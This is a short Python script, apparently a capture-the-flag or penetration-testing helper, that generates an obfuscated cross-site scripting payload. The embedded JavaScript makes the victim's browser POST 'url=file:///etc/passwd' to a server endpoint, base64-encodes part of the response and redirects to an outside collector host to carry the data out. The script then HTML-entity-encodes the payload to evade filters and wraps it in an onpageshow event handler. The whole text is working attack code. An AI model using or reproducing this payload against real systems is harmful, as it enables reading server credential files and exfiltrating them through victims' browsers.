payload='''xmlhttp=new XMLHttpRequest();
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        document.location='http://guui9d.ceye.io/'+btoa(xmlhttp.responseText.substr(1200,1500));
    }
}
xmlhttp.open('POST','request.php',true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send('url=file:///etc/passwd');'''
html_payload=""
for each in payload:
	html_payload=html_payload+"&#%d;"%ord(each)
print('<body/onpageshow="'+html_payload+'">')